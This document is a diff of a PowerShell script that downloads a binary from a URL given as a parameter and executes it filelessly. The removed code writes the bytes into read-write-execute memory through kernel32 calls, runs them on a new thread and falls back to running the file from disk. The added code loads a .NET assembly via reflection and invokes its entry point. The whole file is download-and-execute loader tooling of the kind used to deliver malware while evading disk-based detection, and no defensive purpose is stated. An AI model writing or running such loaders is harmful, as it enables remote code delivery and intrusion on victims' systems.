@@ -1,7 +1,7 @@
 param ( [string]$Payload )
 
-# Function to download and execute a binary in memory
-function Execute-NativeBinaryInMemory {
+# Function to download and execute a .NET binary in memory using reflection
+function Execute-DotNetBinaryInMemory {
     param ( [string]$Url )
     try {
         Write-Output "Attempting to download binary from $Url"
@@ -10,174 +10,75 @@ function Execute-NativeBinaryInMemory {
         $binaryData = $webClient.DownloadData($Url)
         Write-Output "Downloaded $($binaryData.Length) bytes from $Url"
 
-        # Check if binary size is reasonable to avoid memory issues
-        if ($binaryData.Length -gt 10MB) {
-            Write-Warning "Binary size exceeds 10MB. Falling back to disk-based execution to avoid memory issues."
-            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
+        # Check if the binary is likely a .NET assembly by inspecting the PE header
+        # .NET assemblies have a specific signature in the PE header (COM Directory Table)
+        if ($binaryData.Length -lt 128) {
+            Write-Error "Binary is too small to be a valid executable."
+            return $false
         }
 
-        # Use Windows API to allocate memory and execute the binary
-        Add-Type -TypeDefinition @"
-        using System;
-        using System.Runtime.InteropServices;
-        public class NativeExecution {
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr GetCurrentProcess();
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern uint GetCurrentProcessId();
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern bool CloseHandle(IntPtr hObject);
-            
-            [DllImport("kernel32.dll", SetLastError = true)]
-            public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+        # Read the MZ signature (first 2 bytes should be 0x4D 0x5A for PE files)
+        if ($binaryData[0] -ne 0x4D -or $binaryData[1] -ne 0x5A) {
+            Write-Error "Binary does not appear to be a valid PE executable (missing MZ signature)."
+            return $false
         }
-"@
 
-        # Allocate memory for the binary
-        $memSize = $binaryData.Length
-        Write-Output "Allocating $memSize bytes in memory"
-        $memPtr = [NativeExecution]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-        if ($memPtr -eq [IntPtr]::Zero) {
-            Write-Error "Failed to allocate memory for binary. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-            Write-Output "Falling back to disk-based execution."
-            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
+        # Read the PE header offset (at position 0x3C, little-endian dword)
+        $peOffset = [BitConverter]::ToInt32($binaryData, 0x3C)
+        if ($peOffset -lt 0 -or $peOffset -gt $binaryData.Length - 24) {
+            Write-Error "Invalid PE header offset."
+            return $false
         }
-        Write-Output "Memory allocated at address: $memPtr"
 
-        # Get the current process ID and open a handle with full access
-        $processId = [NativeExecution]::GetCurrentProcessId()
-        Write-Output "Current process ID: $processId"
-        $PROCESS_ALL_ACCESS = 0x1F0FFF
-        $processHandle = [NativeExecution]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
-        if ($processHandle -eq [IntPtr]::Zero) {
-            Write-Error "Failed to open current process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-            Write-Output "Falling back to GetCurrentProcess()"
-            $processHandle = [NativeExecution]::GetCurrentProcess()
-            if ($processHandle -eq [IntPtr]::Zero) {
-                Write-Error "Fallback failed. Unable to get process handle. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-                Write-Output "Falling back to disk-based execution."
-                if ($memPtr -ne [IntPtr]::Zero) {
-                    [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
-                }
-                return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
-            }
+        # Check PE signature (should be 0x50 0x45 0x00 0x00)
+        if ($binaryData[$peOffset] -ne 0x50 -or $binaryData[$peOffset+1] -ne 0x45 -or $binaryData[$peOffset+2] -ne 0x00 -or $binaryData[$peOffset+3] -ne 0x00) {
+            Write-Error "Binary does not have a valid PE signature."
+            return $false
         }
-        Write-Output "Current process handle obtained: $processHandle"
 
-        # Write the binary to the allocated memory in chunks to avoid crashes
-        $bytesWritten = 0
-        $chunkSize = 1024 * 1024 # 1MB chunks
-        $offset = 0
-        Write-Output "Writing $memSize bytes to memory at $memPtr in chunks of $chunkSize bytes"
-        while ($offset -lt $memSize) {
-            $remaining = [Math]::Min($chunkSize, $memSize - $offset)
-            $chunk = New-Object byte[] $remaining
-            [Array]::Copy($binaryData, $offset, $chunk, 0, $remaining)
-            $tempBytesWritten = 0
-            $success = [NativeExecution]::WriteProcessMemory($processHandle, [IntPtr]::Add($memPtr, $offset), $chunk, $remaining, [ref]$tempBytesWritten)
-            if (-not $success) {
-                Write-Error "Failed to write chunk at offset $offset to memory. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-                Write-Output "Falling back to disk-based execution."
-                if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
-                    [NativeExecution]::CloseHandle($processHandle)
-                }
-                if ($memPtr -ne [IntPtr]::Zero) {
-                    [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
-                }
-                return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
-            }
-            $bytesWritten += $tempBytesWritten
-            $offset += $remaining
+        # Check for .NET metadata (COM Directory Table at Optional Header + 0xE0 for PE32, 0xF0 for PE32+)
+        # First, check if it's PE32 or PE32+ (at PE header + 0x18, magic number)
+        $magic = [BitConverter]::ToUInt16($binaryData, $peOffset + 0x18)
+        $comDirOffset = $peOffset + (if ($magic -eq 0x10B) { 0xE0 } else { 0xF0 })
+        if ($comDirOffset + 8 -gt $binaryData.Length) {
+            Write-Error "Binary header is too short to contain COM Directory Table."
+            return $false
         }
-        Write-Output "Wrote $bytesWritten bytes to memory"
 
-        # Create a thread to execute the binary in memory
-        $threadId = 0
-        $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
-        if ($threadHandle -eq [IntPtr]::Zero) {
-            Write-Error "Failed to create thread for execution. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
-            Write-Output "Falling back to disk-based execution."
-            if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
-                [NativeExecution]::CloseHandle($processHandle)
-            }
-            if ($memPtr -ne [IntPtr]::Zero) {
-                [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
-            }
-            return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
+        $comDirRva = [BitConverter]::ToUInt32($binaryData, $comDirOffset)
+        if ($comDirRva -eq 0) {
+            Write-Error "Binary does not appear to be a .NET assembly (no COM Directory Table). Cannot execute unmanaged binaries filelessly in PowerShell without native API calls."
+            Write-Output "As a fallback, consider using a different tool or language (e.g., C# executable) for native binary execution."
+            return $false
         }
-        Write-Output "Thread created with ID: $threadId"
 
-        # Wait for the thread to complete with a timeout to prevent hanging
-        $timeout = 30000 # 30 seconds
-        $result = [NativeExecution]::WaitForSingleObject($threadHandle, $timeout)
-        if ($result -eq 0x00000102) { # WAIT_TIMEOUT
-            Write-Warning "Thread execution timed out after $timeout ms. Continuing anyway."
-        }
-        Write-Output "Executed native binary from $Url in memory."
+        Write-Output "Binary appears to be a .NET assembly. Attempting in-memory execution via reflection."
 
-        # Clean up resources
-        if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
-            [NativeExecution]::CloseHandle($processHandle)
+        # Load the assembly into memory
+        $assembly = [System.Reflection.Assembly]::Load($binaryData)
+        if (-not $assembly) {
+            Write-Error "Failed to load the assembly into memory."
+            return $false
         }
-        if ($threadHandle -ne [IntPtr]::Zero) {
-            [NativeExecution]::CloseHandle($threadHandle)
-        }
-        if ($memPtr -ne [IntPtr]::Zero) {
-            [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
-        }
-    }
-    catch {
-        Write-Error "Error executing native binary in memory: $_"
-        Write-Output "Falling back to disk-based execution due to error."
-        if ($memPtr -ne [IntPtr]::Zero) {
-            [NativeExecution]::VirtualFree($memPtr, 0, 0x8000) # MEM_RELEASE
-        }
-        if ($processHandle -ne [IntPtr]::Zero -and $processHandle -ne [NativeExecution]::GetCurrentProcess()) {
-            [NativeExecution]::CloseHandle($processHandle)
-        }
-        return Execute-BinaryOnDisk -Url $Url -BinaryData $binaryData
-    }
-}
+        Write-Output "Assembly loaded into memory successfully: $($assembly.FullName)"
 
-# Fallback function to save binary to disk and execute it
-function Execute-BinaryOnDisk {
-    param ( [string]$Url, [byte[]]$BinaryData )
-    try {
-        Write-Output "Executing binary on disk as fallback."
-        $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
-        Write-Output "Saving binary to temporary file: $tempPath"
-        [System.IO.File]::WriteAllBytes($tempPath, $BinaryData)
-        Write-Output "Starting process from disk."
-        $process = Start-Process -FilePath $tempPath -NoNewWindow -PassThru
-        Write-Output "Process started with ID: $($process.Id)"
+        # Find the entry point (Main method)
+        $entryPoint = $assembly.EntryPoint
+        if (-not $entryPoint) {
+            Write-Error "No entry point (Main method) found in the assembly."
+            return $false
+        }
+        Write-Output "Entry point found: $($entryPoint.Name)"
+
+        # Invoke the entry point
+        Write-Output "Invoking entry point for execution."
+        $result = $entryPoint.Invoke($null, @())
+        Write-Output "Execution completed. Result: $result"
         return $true
     }
     catch {
-        Write-Error "Error executing binary on disk: $_"
+        Write-Error "Error executing .NET binary in memory: $_"
         return $false
-    }
-    finally {
-        if (Test-Path $tempPath) {
-            Write-Output "Cleaning up temporary file: $tempPath"
-            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-        }
     }
 }
 
@@ -187,18 +88,22 @@ function Exec {
     Write-Output "Processing payload: $Payload"
     # Check if the payload is a URL (for downloading a binary)
     if ($Payload -match "^https?://") {
-        # Attempt to execute as a native binary in memory
-        Execute-NativeBinaryInMemory -Url $Payload
+        # Attempt to execute as a .NET binary in memory
+        $success = Execute-DotNetBinaryInMemory -Url $Payload
+        if (-not $success) {
+            Write-Output "Fileless execution failed. If the binary is not a .NET assembly, PowerShell cannot execute it filelessly without native API calls, which cause crashes."
+            Write-Output "Recommendation: Use a compiled helper in C# or C++ for native binaries, or revert to disk-based execution."
+        }
     }
     else {
         Write-Error "Unsupported payload type. Provide a URL to a binary for in-memory execution."
     }
 }
 
-# Check if running with elevated privileges
+# Check if running with elevated privileges (just for informational purposes)
 $isElevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isElevated) {
-    Write-Warning "Script is not running with elevated privileges. Memory operations may fail. Consider running as Administrator."
+    Write-Warning "Script is not running with elevated privileges. Some operations may fail if additional permissions are required."
 }
 
 # Execute the payload passed as an argument
